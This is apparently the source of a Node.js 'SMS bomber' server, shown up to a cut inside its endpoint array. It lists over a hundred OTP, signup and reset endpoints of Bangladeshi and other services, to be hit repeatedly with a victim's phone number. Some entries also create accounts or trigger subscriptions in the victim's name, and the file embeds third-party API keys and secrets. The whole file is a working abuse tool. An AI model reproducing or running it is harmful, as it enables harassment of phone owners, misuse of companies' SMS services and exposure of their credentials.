// ============================================================
// ULTIMATE SMS BOMBER V9.0 — api/index.js (TNEH GROUP Edition)
// Based on V8.6-SINGLE + fixes + new APIs + each BD API ×2
// ============================================================
const express = require('express');
const axios = require('axios');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const CONFIG = {
  server: { port: process.env.PORT || 3000, host: '0.0.0.0' },
  performance: {
    timeout: 25000,
    concurrency: 20,
    maxCountPerAPI: 500,
    delayBetweenBatches: 100
  },
  security: { rateLimit: { enabled: false } }
};

const DEVELOPER_INFO = {
  developer: "TNEH GROUP",
  telegram: "@tneh_owner",
  api_version: "9.0.0-TNEH"
};

const ERROR_MESSAGES = {
  MISSING_PARAM: 'Missing parameter',
  INVALID_PHONE: 'Invalid phone',
  INVALID_API_KEY: 'Invalid key',
  JOB_NOT_FOUND: 'Job not found'
};

class Utility {
  static generateId() { return crypto.randomBytes(16).toString('hex'); }
  static generateJobId() {
    return `JOB_${Date.now().toString(36).toUpperCase()}_${crypto.randomBytes(4).toString('hex').toUpperCase()}`;
  }
  static generateApiKey() {
    return `TNEH_${crypto.randomBytes(24).toString('hex').toUpperCase()}_${Date.now().toString(36).toUpperCase()}`;
  }
  static getISOString() { return new Date().toISOString(); }
  static maskPhone(p) {
    return (!p || p.length < 7) ? '***' : p.slice(0, 3) + '****' + p.slice(-3);
  }
  static parsePhone(p) { return String(p).replace(/[^0-9]/g, ''); }

  static isValidBD(p) {
    const c = this.parsePhone(p);
    return /^(01)[3-9][0-9]{8}$/.test(c) || /^(8801)[3-9][0-9]{8}$/.test(c);
  }
  static normalizeBD(p) {
    const c = this.parsePhone(p);
    if (c.startsWith('8801')) return c.slice(2);
    if (c.startsWith('880')) return '0' + c.slice(3);
    if (c.startsWith('01')) return c;
    return c;
  }

  static isValidIN(p) {
    const c = this.parsePhone(p).replace(/^91/, '').replace(/^0+/, '');
    return /^[6-9][0-9]{9}$/.test(c);
  }
  static normalizeIN(p) {
    const raw = this.parsePhone(p);
    if (raw.startsWith('91') && raw.length === 12) return raw.slice(2);
    if (raw.startsWith('0')) return raw.slice(1);
    return raw;
  }

  static formatBytes(b) {
    if (b === 0) return '0 B';
    const k = 1024, sizes = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(b) / Math.log(k));
    return (b / Math.pow(k, i)).toFixed(2) + ' ' + sizes[i];
  }
  static getMemoryUsage() {
    const u = process.memoryUsage();
    return { rss: this.formatBytes(u.rss), heapUsed: this.formatBytes(u.heapUsed) };
  }
}

const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  'Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 Chrome/120.0.0.0 Mobile Safari/537.36',
  'Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 Safari/605.1.15'
];

function getHeaders(extra = {}) {
  return {
    'User-Agent': USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'en-US,en;q=0.9,bn;q=0.8',
    'Connection': 'keep-alive',
    'Cache-Control': 'no-cache',
    ...extra
  };
}

// ============================================================
// BD API LIST — প্রতিটি দুইবার হবে (V1 + V2)
// ============================================================
const BD_APIS_RAW = [
  // ---- আপনার V8.6 এর original BD APIs ----
  { name: "QuizGiri JSON", method: "POST", url: "https://developer.quizgiri.xyz/api/v2.0/send-otp?phone={phone}&country_code=+880&fcm_token=null" },
  { name: "Dhaka Bank", method: "POST", url: "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber", body: '{"AccessToken":"","TrackingNo":"","mobileNo":"{phone}","otpSms":"","product_id":"250","requestChannel":"MOB","trackingStatus":5}' },
  { name: "Circle Robi", method: "POST", url: "https://circle.robi.com.bd/mylife/gateway/register_fcm.php?regId&msisdn=88{phone}" },
  { name: "Shajgoj OTP", method: "POST", url: "https://shop.shajgoj.com/wp-admin/admin-ajax.php", body: { action: "xoo_ml_login_with_otp", "xoo-ml-phone-login": "{phone}", "xoo-ml-form-token": "4840", "xoo-ml-form-type": "login_user_with_otp" }, isFormData: true },
  { name: "KhaoDao", method: "POST", url: "https://api.eat-z.com/auth/customer/signin", body: '{"username":"+88{phone}"}' },
  { name: "TheMallBD", method: "POST", url: "https://themallbd.com/api/auth/otp_login", body: '{"phone_number":"+88{phone}"}' },
  { name: "Fundesh Win", method: "POST", url: "https://win.fundesh.com.bd/authSrv/auth/generateOtp", body: '{"msisdn":"{phone}","clientId":"d2c_client"}' },
  { name: "Arogga", method: "POST", url: "https://api.arogga.com/v1/auth/sms/send?f=mobile&b=Chrome&v=101.0.4951.54&os=Android&osv=6.0", body: { mobile: "+88{phone}" }, isFormData: true },
  { name: "OsudPotro", method: "POST", url: "https://api-2.osudpotro.com/api/v1/users/send_otp", body: '{"mobile":"+88-{phone}","deviceToken":"web","language":"en","os":"web"}' },
  { name: "Bongo", method: "POST", url: "https://api.bongo-solutions.com/auth/api/login/send-otp", body: '{"operator":"all","msisdn":"88{phone}"}' },
  { name: "BTCL MyBTCL", method: "POST", url: "https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json", body: '{"phoneNbr":"{phone}","email":"","OTPType":1,"userName":""}' },
  { name: "BTCL PhoneBill", method: "POST", url: "https://phonebill.btcl.com.bd/api/bcare/anonym/sendOTP.json", body: '{"phoneNbr":"{phone}","email":"","OTPType":1,"userName":""}' },
  { name: "Bioscope Plus", method: "POST", url: "https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en", body: '{"number":"+88{phone}"}' },
  { name: "BD Tickets", method: "POST", url: "https://api.bdtickets.com:20100/v1/auth", body: '{"createUserCheck":true,"phoneNumber":"+88{phone}","applicationChannel":"WEB_APP"}' },
  { name: "Apex4U", method: "POST", url: "https://api.apex4u.com/api/auth/login", body: '{"phoneNumber":"0{phone}"}' },
  { name: "Swap.com.bd", method: "POST", url: "https://api.swap.com.bd/api/v1/send-otp/v2", body: '{"phone":"0{phone}"}' },
  { name: "Ilyn Global", method: "POST", url: "https://api.ilyn.global/auth/signup", body: '{"phone":{"code":"BD","number":"+880{phone}"},"provider":"sms"}' },
  { name: "Garibook", method: "POST", url: "https://api.garibookadmin.com/api/v3/user/login", body: '{"mobile":"0{phone}","recaptcha_token":"garibookcaptcha","channel":"web"}' },
  { name: "Sheba", method: "POST", url: "https://accountkit.sheba.xyz/api/shoot-otp", body: '{"mobile":"+88{phone}","app_id":"8329815A6D1AE6DD","api_token":"zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH"}' },
  { name: "AppLink", method: "POST", url: "https://apps.applink.com.bd/appstore-v4-server/login/otp/request", body: '{"msisdn":"88{phone}"}' },
  { name: "Bikroy", method: "GET", url: "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0{phone}" },
  { name: "Cinematic WAP", method: "POST", url: "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/+88{phone}" },
  { name: "GP Web Login", method: "POST", url: "https://webloginda.grameenphone.com/backend/api/v1/otp", body: { msisdn: "0{phone}" }, isFormData: true },
  { name: "Ghoori", method: "POST", url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web", body: '{"mobile_no":"0{phone}"}' },
  { name: "DeeptoPlay", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: '{"number":"+880{phone}"}' },
  { name: "ePharma", method: "POST", url: "https://epharma.com.bd/authentication/send-otp", body: { number: "+88{phone}" }, isFormData: true },
  { name: "Sailor Clothing", method: "POST", url: "https://backend.sailor.clothing/api/v2/auth/password/forget_request", body: '{"email_or_phone":"0{phone}","send_code_by":"phone"}' },
  { name: "Isho", method: "POST", url: "https://www.isho.com/register_otp", body: { phone: "0{phone}", email: "test@gmail.com" }, isFormData: true },
  { name: "Osudpotro Alt", method: "POST", url: "https://api.osudpotro.com/api/v1/users/send_otp", body: '{"mobile":"+88-{phone}","deviceToken":"web","language":"en","os":"web"}' },
  { name: "TheClinicall", method: "POST", url: "https://theclinicall.com/bkapi/auth/user/otp/signin", body: '{"countryCode":"BD","dialCode":"880","phone":"{phone}"}' },
  { name: "Shombhob", method: "POST", url: "https://shombhob.com/api/otp-login", body: '{"phone":"0{phone}"}' },
  { name: "Care Box", method: "POST", url: "https://www.api-care-box.click/api/user/register/?version=otp", body: '{"Name":"Rakib Khan","Phone":"+880{phone}"}' },
  { name: "Renix Care", method: "POST", url: "https://renixapi.renixcare.com/sms-api/send-otp", body: '{"phone":"0{phone}"}' },
  { name: "Jayabaji", method: "POST", url: "https://www.jayabaji3.com/api/register/check-username", body: '{"username":"sojib12345","email":"","mobileno":"{phone}","language":"bn","langCountry":"bn-bd"}' },
  { name: "PKLuck2", method: "POST", url: "https://www.pkluck2.com/wps/verification/sms/noLogin", body: '{"mobileNum":"0{phone}","countryDialingCode":"880"}' },
  { name: "GP Flexiplan", method: "POST", url: "https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation", body: '{"payment_mode":"mobile_balance","longevity":1,"voice":100,"data":0,"fourg":0,"bioscope":0,"sms":0,"mca":0,"price":69,"msisdn":"0{phone}","bundle_id":60817,"is_login":false}' },
  { name: "GP FWA", method: "POST", url: "https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp", body: '{"phone":"0{phone}","email":"","language":"en"}' },
  { name: "Priyoshikkhaloy", method: "POST", url: "https://app.priyoshikkhaloy.com/api/user/register-login.php", body: { mobile: "0{phone}" }, isFormData: true },
  { name: "Doctime Firebase", method: "POST", url: "https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber", body: '{"data":{"country_calling_code":"88","contact_no":"{phone}","headers":{"PlatForm":"Web"}}}' },
  { name: "Sundarban GraphQL", method: "POST", url: "https://api-gateway.sundarbancourierltd.com/graphql", body: '{"operationName":"CreateAccessToken","variables":{"accessTokenFilter":{"userName":"{phone}"}},"query":"mutation{createAccessToken(accessTokenFilter:{userName:\\"{phone}\\"}){message}}"}' },
  { name: "Robi Doorstep", method: "POST", url: "https://webapi.robi.com.bd/v1/send-otp", body: '{"phone_number":"{phone}","type":"doorstep"}' },
  { name: "Banglalink OTP", method: "POST", url: "https://web-api.banglalink.net/api/v1/user/otp-login/request", body: '{"mobile":"{phone}"}' },
  { name: "GP OTP", method: "POST", url: "https://webloginda.grameenphone.com/backend/api/v1/otp", body: { msisdn: "{phone}" }, isFormData: true },
  { name: "Robi MyOffer", method: "POST", url: "https://webapi.robi.com.bd/v1/send-otp", body: '{"phone_number":"{phone}","type":"my_offer"}' },
  { name: "Robi DA NLL", method: "POST", url: "https://da-api.robi.com.bd/da-nll/otp/send", body: '{"msisdn":"{phone}"}' },
  { name: "Robi Video Chat", method: "POST", url: "https://webapi.robi.com.bd/v1/chat/send-otp", body: '{"phone_number":"{phone}","name":"BILLAVAI","type":"video-chat"}' },
  { name: "Redx Merchant", method: "POST", url: "https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", body: '{"phoneNumber":"{phone}"}' },
  { name: "Motionview", method: "POST", url: "https://api.motionview.com.bd/api/send-otp-phone-signup", body: '{"phone":"{phone}"}' },
  { name: "Chorki Login", method: "POST", url: "https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", body: '{"number":"+88{phone}"}' },
  { name: "Jatri", method: "POST", url: "https://user-api.jslglobal.co:444/v2/send-otp", body: '{"phone":"+88{phone}","jatri_token":"J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"}' },
  { name: "ChinaOnlineBD", method: "GET", url: "https://chinaonlinebd.com/api/login/getOtp?phone={phone}" },
  { name: "Shikho", method: "POST", url: "https://api.shikho.com/auth/v2/send/sms", body: '{"phone":"{phone}","type":"student","auth_type":"signup"}' },
  { name: "Chokrojan", method: "POST", url: "https://chokrojan.com/api/v1/passenger/login/mobile", body: '{"mobile_number":"{phone}"}' },
  { name: "Easy Forgot", method: "POST", url: "https://core.easy.com.bd/api/v1/forgot-password-otp", body: '{"device_key":"2ea97d276a980993308116baa292cec9","mobile":"{phone}"}' },
  { name: "Walton Plaza", method: "POST", url: "https://waltonplaza.com.bd/api/auth/otp/create", body: '{"auth":{"countryCode":"880","deviceUuid":"ee757830-f639-12f0-9f4d-2f972746fhg","phone":"{phone}"},"captchaToken":"recapcha"}' },
  { name: "Chardike", method: "POST", url: "https://api.chardike.com/api/otp/send", body: '{"phone":"{phone}","otp_type":"login"}' },
  { name: "AWS OTP", method: "POST", url: "https://8t09wa0n0a.execute-api.ap-south-1.amazonaws.com/poc/api/v1/otp/send", body: '{"phone":"{phone}"}' },
  { name: "Otithee", method: "POST", url: "https://gateway.otithee.com/api/v1/generate-otp", body: '{"request_type":"registration","mobile_number":"{phone}"}' },
  { name: "Mojaru", method: "POST", url: "https://new.mojaru.com/api/student/login", body: '{"mobile_or_email":"{phone}"}' },
  { name: "GP AppCity", method: "POST", url: "https://appcity.grameenphone.com/proxy/v2/user/session/get-otp", body: '{"mobileNumber":"{phone}"}' },
  { name: "BD Matrimony", method: "GET", url: "https://www.bangladeshimatrimony.com/register/editmobileno.php?mobileNo={phone}" },
  { name: "Upay Wallet", method: "POST", url: "https://api.upaysystem.com/dfsc/oam/app/v1/wallet-verification-init/", body: '{"wallet_number":"{phone}","geo_location":{"lat":23.89,"long":89.13},"referral":"","firebase_token":"dummy","device_uuid":"c65m117a8cbf5b1851b29f8b","mno":"Robi"}' },
  { name: "Bohubrihi", method: "POST", url: "https://bb-api.bohubrihi.com/public/activity/otp", body: '{"phone":"{phone}","intent":"login"}' },
  { name: "TimezoneBD", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/otp-login", body: '{"phone":"{phone}"}' },
  { name: "Shikho Public", method: "POST", url: "https://api.shikho.com/public/activity/otp", body: '{"phone":"{phone}","intent":"ap-discount-request"}' },
  { name: "Ostad", method: "POST", url: "https://api.ostad.app/api/v2/user/with-otp", body: '{"msisdn":"{phone}"}' },
  { name: "iEducation", method: "POST", url: "https://www.ieducationbd.com/api/account/check_user", body: '{"mobile":"{phone}"}' },
  { name: "Hishabee", method: "GET", url: "https://app.hishabee.business/api/V2/otp/send?mobile_number={phone}" },
  { name: "Roots Edu Reg", method: "POST", url: "https://rootsedulive.com/api/auth/register", body: '{"name":"BILLAVAI","phone":"88{phone}","email":"temp{phone}@bomb.bd","password":"Secure@2025","confirmPassword":"Secure@2025"}' },
  { name: "Roots Edu Forget", method: "POST", url: "https://rootsedulive.com/api/auth/forget-password", body: '{"phoneOrEmail":"88{phone}"}' },
  { name: "MithaiBD", method: "POST", url: "https://mithaibd.com/api/login/", body: '{"company_id":"2","phone":"{phone}","email":"attack{phone}@mail.com","password1":"pass123","otp_verify":false}' },
  { name: "English Moja", method: "POST", url: "https://api.englishmojabd.com/api/v1/auth/login", body: '{"phone":"+88{phone}"}' },
  { name: "Moveon", method: "POST", url: "https://moveon.com.bd/api/v1/customer/auth/phone/request-otp", body: '{"phone":"{phone}"}' },
  { name: "MyGP Cinematic", method: "GET", url: "https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{phone}/" },
  { name: "Qcoom", method: "POST", url: "https://auth.qcoom.com/api/v1/otp/send", body: '{"mobileNumber":"+88{phone}"}' },
  { name: "Circle Reseller", method: "POST", url: "https://reseller.circle.com.bd/api/v2/auth/signup", body: '{"name":"+88{phone}","email_or_phone":"+88{phone}","password":"123456","password_confirmation":"123456","register_by":"phone"}' },
  { name: "Shomvob", method: "POST", url: "https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0", body: '{"phone":"{phone}"}' },
  { name: "Toybox", method: "POST", url: "https://api.toybox.live/bdapps_handler.php", body: { Operation: "CreateSubscription", MobileNumber: "88{phone}", PackageID: "100", Secret: "HJKX71%UHYH" }, isFormData: true },
  { name: "Win2gain", method: "GET", url: "https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{phone}" },
  { name: "BD Kepler", method: "POST", url: "https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp", body: '{"deviceId":"prodevice","operator":"Gp","walletNumber":"{phone}"}' },
  { name: "GP BkWebsite", method: "POST", url: "https://bkwebsitethc.grameenphone.com/api/v1/offer/send_otp", body: '{"msisdn":"{phone}"}' },
  { name: "BdStall", method: "POST", url: "https://www.bdstall.com/userRegistration/save_otp_info/", body: { UserTypeID: "2", RequestType: "1", Name: "Md", Mobile: "{phone}" }, isFormData: true },
  { name: "BCS Examaid", method: "POST", url: "https://bcsexamaid.com/api/generateotp", body: '{"mobile":"{phone}","softtoken":"Rifat.Admin.2022"}' },
  { name: "DoctorLiveBD", method: "POST", url: "https://doctorlivebd.com/api/patient/auth/otpsend", body: { country_code: "880", mobile: "{phone}" }, isFormData: true },
  { name: "Sindabad", method: "POST", url: "https://offers.sindabad.com/api/mobile-otp", body: '{"key":"c94e67fb2a59af3b6fa21f24463b2061","mobile":"+88{phone}"}' },
  { name: "KireiBD", method: "POST", url: "https://app.kireibd.com/api/v2/send-login-otp", body: '{"email":"{phone}"}' },
  { name: "RFL BestBuy", method: "POST", url: "https://rflbestbuy.com/api/login/?lang_code=en&currency_code=BDT", body: '{"company_id":"26","password2":"Riyaz@123","currency_code":"BDT","user_type":"C","email":"{phone}@gmail.com","g_id":"","lang_code":"en","operating_system":"Android","otp_verify":false,"password1":"Riyaz@123","phone":"{phone}","storefront_id":"3"}' },
  { name: "HishabExpress", method: "POST", url: "https://api.hishabexpress.com/login/status", body: { msisdn: "{phone}", hash: "Hello" }, isFormData: true },
  { name: "Chorcha", method: "GET", url: "https://mujib.chorcha.net/auth/check?phone={phone}" },
  { name: "Wafilife", method: "GET", url: "https://m-backend.wafilife.com/wp-json/wc/v2/send-otp?p={phone}&consumer_key=ck_e8c5b4a69729dd913dce8be03d7878531f6511ff&consumer_secret=cs_f866e5c6543065daa272504c2eea71044579cff3" },
  { name: "Robi Register", method: "POST", url: "https://webapi.robi.com.bd/v1/account/register/otp", body: '{"phone_number":"{phone}"}' },
  { name: "eTestPaper Exists", method: "POST", url: "https://prod.etestpaper.net/api/exists", body: '{"phone":"{phone}"}' },
  { name: "eTestPaper OTP", method: "POST", url: "https://prod.etestpaper.net/api/v4/auth/otp", body: '{"phone":"{phone}","recaptcha":"668be73dcad2999a957ff440"}' },
  { name: "GPay CheckSignup", method: "POST", url: "https://gpayapp.grameenphone.com/prod_mfs/sub/user/checksignup", body: '{"deviceId":"35{phone}30","msisdn":"{phone}","tran_type":"OTPREQSIGNUP"}' },
  { name: "Kabbik", method: "POST", url: "https://api.kabbik.com/v1/auth/otpnew", body: '{"msisdn":"88{phone}","currentTimeLong":"{ts}","passKey":"qOQNBtVmoTTPVmfn"}' },
  { name: "Salextra", method: "POST", url: "https://salextra.com.bd/customer/checkusernameavailabilityonregistration", body: { username: "{phone}", loginType: "MOBILE" }, isFormData: true },
  { name: "Sundora", method: "POST", url: "https://api.sundora.com.bd/api/user/customer/", body: '{"customer":{"email":"kgjkgjgg{phone}@gmail.com","password":"#bUV?3*N7N.g","password_confirmation":"#bUV?3*N7N.g","phone":"+880{phone}","first_name":"sdfgfd","last_name":"fgfd","newsletter_email":true,"newsletter_sms":true}}' },
  { name: "Cinematic SBENT", method: "POST", url: "https://api.mygp.cinematic.mobi/api/v1/otp/88{phone}/SBENT_3GB7D", body: '{"accessinfo":{"access_token":"K165S6V6q4C6G7H0y9C4f5W7t5YeC6","referenceCode":"20190827042622"}}' },
  { name: "Bajistar", method: "GET", url: "https://bajistar.com:1443/public/api/v1/getOtp?recipient=88{phone}" },
  { name: "Meenabazar", method: "POST", url: "https://meenabazardev.com/api/mobile/front/send/otp?CellPhone={phone}&type=login" },
  { name: "IQRA", method: "GET", url: "http://apibeta.iqra-live.com/api/v1/sent-otp/{phone}" },
  { name: "MyBDJobs", method: "POST", url: "https://mybdjobsorchestrator-odcx6humqq-as.a.run.app/api/CreateAccountOrchestrator/CreateAccount", body: '{"firstName":"Test","lastName":"","gender":"M","email":"test{phone}@gmail.com","userName":"{phone}","password":"Kamrul12345@","confirmPassword":"Kamrul12345@","status":0,"mobile":"{phone}","workAreaCategory":2,"createdFrom":0,"createdAt":"{ts}","userNameType":"mobile","countryCode":"88"}' },
  { name: "GX Sends", method: "GET", url: "https://gxsends.onrender.com/run-all?phone={phone}" },
  { name: "RedX Signup", method: "POST", url: "https://api.redx.com.bd/v1/user/signup", body: '{"name":"{phone}","service":"redx","phoneNumber":"{phone}"}' },
  { name: "KhaasFood Step1", method: "POST", url: "https://www.khaasfood.com/wp-admin/admin-ajax.php", body: { mobileNo: "+880{phone}", countrycode: "+880", csrf: "9d9d08e6e5", login: "1", json: "1", action: "digits_check_mob" }, isFormData: true },
  { name: "Proiojon", method: "POST", url: "https://billing.proiojon.com/api/v1/auth/sign-up", body: '{"phone":"{phone}","password":"password123"}' },
  { name: "BeautyBooth", method: "POST", url: "https://admin.beautybooth.com.bd/api/v2/auth/signup", body: '{"phone":"{phone}"}' },
  { name: "Medha", method: "POST", url: "https://developer.medha.info/api/send-otp", body: '{"phone":"880{phone}","is_register":"1"}' },
  { name: "Chorki Mobile", method: "POST", url: "https://api-dynamic.chorki.com/v1/auth/login?country=BD&platform=mobile", body: '{"number":"{phone}"}' },
  { name: "DocTime", method: "POST", url: "https://api.doctime.com.bd/api/authenticate", body: '{"contact_no":"{phone}","country_calling_code":"88"}' },
  { name: "eCourier", method: "GET", url: "https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={phone}" },
  { name: "Binge GET", method: "GET", url: "https://ss.binge.buzz/otp/send/login{phone}" },
  { name: "Daktarbhai", method: "GET", url: "https://api.daktarbhai.com/api/v2/otp/generate?api_key=BUFWICFGGNILMSLIYUVH&api_secret=WZENOMMJPOKHYOMJSPOGZNAGMPAEZDMLNVXGMTVE&mobile=%2B88{phone}&platform=app&activity=login" },
  { name: "Deshal", method: "POST", url: "https://app.deshal.net/api/auth/login", body: '{"phone":"{phone}"}' },
  { name: "BusBD", method: "POST", url: "https://api.busbd.com.bd/api/auth", body: '{"phone":"+88{phone}"}' },
  { name: "Hoichoi", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=hoichoitv", body: '{"phoneNumber":"{phone}","requestType":"send","emailConsent":true,"whatsappConsent":true}' },
  { name: "Addatimes", method: "POST", url: "https://app.addatimes.com/api/login", body: '{"phone":"{phone}","country_code":"BD"}' },
  { name: "Regal OTP", method: "POST", url: "https://regalfurniturebd.com/api/auth/otp-generate", body: '{"phone":"{phone}","verification_code":""}' },
  { name: "Regal Register", method: "POST", url: "https://regalfurniturebd.com/api/auth/register", body: '{"name":"User","email":"u@e.com","phone":"{phone}","password":"pass123"}' },
  { name: "DeeptoPlay Web", method: "POST", url: "https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en", body: '{"email":"apk@test.com","phone_number":"88{phone}"}' },
  { name: "Timezone OTP", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/otp-request", body: '{"phone":"{phone}"}' },
  { name: "Timezone Register", method: "POST", url: "https://backend.timezonebd.com/api/v1/user/regnewcustomer", body: '{"name":"Tusar","email":"t@t.com","phone":"{phone}","password":"aAeMY@5hG8iUfD4","password_confirmation":"aAeMY@5hG8iUfD4"}' },
  { name: "Arogga Web", method: "POST", url: "https://api.arogga.com/auth/v1/sms/send?f=mweb&b=Chrome&v=148&os=Android&osv=12", body: { mobile: "{phone}" }, isFormData: true },
  { name: "AppLink V2", method: "POST", url: "https://applink.com.bd/appstore-v4-server/login/otp/request", body: '{"msisdn":"880{phone}"}' },
  { name: "Jayabaji BD", method: "POST", url: "https://www.jayabajibd.life/api/register/confirm", body: '{"mobileno":"{phone}","username":"user864","new_password":"tPNVOcen!6XEz3b","confirm_new_password":"tPNVOcen!6XEz3b","country_code":"880","country":"BD","currency":"BDT","language":"en"}' },
  { name: "BdTickets V1", method: "POST", url: "https://apiv1.bdtickets.com/api/v1/auth/otp/send", body: '{"phone":"+880{phone}"}' },
  { name: "Binge POST", method: "POST", url: "https://ss.binge.buzz/otp/send/login", body: '{"mobile":"{phone}"}' },
  { name: "NESCO", method: "POST", url: "http://nesco.sslwireless.com/api/v1/login", body: '{"phone_number":"{phone}"}' },
  { name: "Bazar365", method: "POST", url: "https://www.bazar365.store/api/v1/auth/sendPhoneOtp", body: '{"phone":"{phone}","applicationChannel":"WEB_APP"}' },
  { name: "Bioscope Web", method: "POST", url: "https://www.bioscopelive.com/en/login/send-otp?phone=880{phone}&operator=bd-otp", body: '{"phone":"{phone}","applicationChannel":"WEB_APP"}' },

  // ---- NEW APIs (আপনার সর্বশেষ দেওয়া) ----
  { name: "Garibook v4", method: "POST", url: "https://api.garibookadmin.com/api/v4/user/login", body: '{"mobile":"+88{phone}","recaptcha_token":"garibookcaptcha","channel":"web"}' },
  { name: "Shwapno Auth", method: "POST", url: "https://www.shwapno.com/api/auth", body: '{"phoneNumber":"+88{phone}"}' },
  { name: "Doctime v2", method: "POST", url: "https://api.doctime.net/api/v2/authenticate", body: '{"country_calling_code":"88","contact_no":"{phone}","timestamp":1777760060}' },
  { name: "MB Online OTP", method: "POST", url: "https://mbonlineapi.com/api/front/send/otp", body: '{"CellPhone":"{phone}","type":"login"}' },
  { name: "Robi Website", method: "POST", url: "https://www.robi.com.bd/en", body: '[{"msisdn":"{phone}"}]' },
  { name: "Kirei BD Frontend", method: "POST", url: "https://frontendapi.kireibd.com/api/v2/send-login-otp", body: '{"email":"{phone}"}' },
  { name: "Karigori Pathsala", method: "GET", url: "https://api.karigoripathsala.com/api/get-otp?phone={phone}" },
  { name: "Binge V4 OTP", method: "POST", url: "https://api.binge.buzz/api/v4/auth/otp/send", body: '{"phone":"+88{phone}"}' },
  { name: "Nexopet OTP", method: "POST", url: "https://host03pet.nexopet.com/api/v1.0/users/send-otp", body: '{"phone":"{phone}"}' },
  { name: "Medico Bio Login", method: "POST", url: "https://api.v2.medico.bio/patient/passwordless-login", body: '{"phoneNumber":"{phone}","deviceId":"{phone}","channel":"web","userType":"patient","type":"newUser"}' },
  { name: "Practice Club", method: "POST", url: "https://www.practiceclub.net/register", body: '{"_token":"JIxET3bBSKUbbUvS0FxcEaMJr0IkXp2KYPsAsoKZ","contact_no":"{phone}"}' },
  { name: "Relaxy OTP", method: "POST", url: "https://dev.api.relaxy.com.bd/api/v1/otp/send", body: '{"phoneNumber":"+88{phone}","appSignature":"your_app_signature"}' },
  { name: "Care Box v444", method: "POST", url: "https://newprod.api-care-box.click:444/api/user/register/?version=otp", body: '{"Name":"MD Hasan","Phone":"+880{phone}"}' },
  { name: "BusBD Access Code", method: "POST", url: "https://api.busbd.com.bd/api/access-code", body: '{"phone":"+88{phone}"}' },
  { name: "Jatri Retail OTP", method: "POST", url: "https://api.retail.jatri.co/auth/api/v1/send-otp", body: '{"phone":"{phone}","purpose":"USER_LOGIN","deviceType":"WEB","cloudFlareToken":"0.token"}' },
  { name: "PBS Alpha OTP", method: "POST", url: "https://apialpha.pbs.com.bd/api/OTP/generateOTP", body: '{"userPhone":"{phone}","otp":""}' },
  { name: "Coke Studio Check GP", method: "POST", url: "https://cokestudio23.sslwireless.com/api/check-gp-number", body: '{"msisdn":"{phone}"}' },
  { name: "Coke Studio OTP", method: "POST", url: "https://cokestudio23.sslwireless.com/api/store-and-send-otp", body: '{"msisdn":"880{phone}","name":"TNEH User","email":"tneh@example.com","dob":"2000-01-01","occupation":"N/A","gender":"male"}' },
  { name: "Paragon Food Login", method: "POST", url: "https://api.paragonfood.com.bd/auth/customerlogin", body: '{"emailOrPhone":"{phone}"}' },
  { name: "Cricbuzz Signup", method: "POST", url: "https://m.cricbuzz.com/cbplus/auth/user/signup", body: '{"username":"{phone}@cricbuzz.tmp"}' },
  { name: "Sundarban Check Username", method: "POST", url: "https://tracking.sundarbancourierltd.com/PreBooking/CheckingUsername", body: '{"PreBookingRegistrationUsername":"{phone}"}' },
  { name: "Ultranet RN", method: "GET", url: "https://ultranetrn.com.br/fonts/api.php?number={phone}" },
  { name: "Airtel Register OTP", method: "POST", url: "https://api.bd.airtel.com/v1/account/register/otp", body: '{"phone_number":"0{phone}"}' },
  { name: "Airtel Login OTP", method: "POST", url: "https://api.bd.airtel.com/v1/account/login/otp", body: '{"phone_number":"0{phone}"}' },
  { name: "Fundesh OTP", method: "POST", url: "https://fundesh.com.bd/api/auth/generateOTP?service_key=", body: '{"msisdn":"{phone}"}' },
  { name: "Swap OTP V1", method: "POST", url: "https://api.swap.com.bd/api/v1/send-otp", body: '{"phone":"0{phone}"}' },
  { name: "Rabbit Hole OTP", method: "POST", url: "https://apix.rabbitholebd.com/appv2/login/requestOTP", body: '{"mobile":"+880{phone}"}' },
  { name: "Prothom Alo OTP", method: "POST", url: "https://prod-api.viewlift.com/identity/signup?site=prothomalo", body: '{"requestType":"send","phoneNumber":"+880{phone}","emailConsent":true,"whatsappConsent":false}' },
  { name: "Tera 1024 Phone Register", method: "GET", url: "https://www.1024tera.com/wap/outlogin/phoneRegister?selectStatus=true&redirectUrl=https%3A%2F%2Fwww.1024tera.com%2Fwap%2Fshare%2Ffilelist&download=0&from=4401900404091&phone={phone}" },
